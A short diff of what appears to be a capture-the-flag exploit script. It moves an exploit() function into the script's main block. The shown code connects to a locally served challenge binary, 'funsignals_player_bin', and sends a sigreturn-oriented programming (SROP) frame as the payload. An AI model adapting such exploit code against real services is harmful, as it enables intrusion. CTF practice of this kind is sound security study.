@@ -65,7 +65,7 @@ def srop(rax, rdi, rsi, rdx, rip):
 
     return frame
 
-def exploit():
+if __name__ == "__main__":
     # socat tcp4-listen:1337,reuseaddr,fork exec:./funsignals_player_bin
     r = remote('127.0.0.1', 1337)
     frame = srop(
@@ -77,7 +77,4 @@ def exploit():
 )
     r.send(bytes(frame))
     print(r.readall().decode())
-
-if __name__ == "__main__":
-    exploit()
 ```
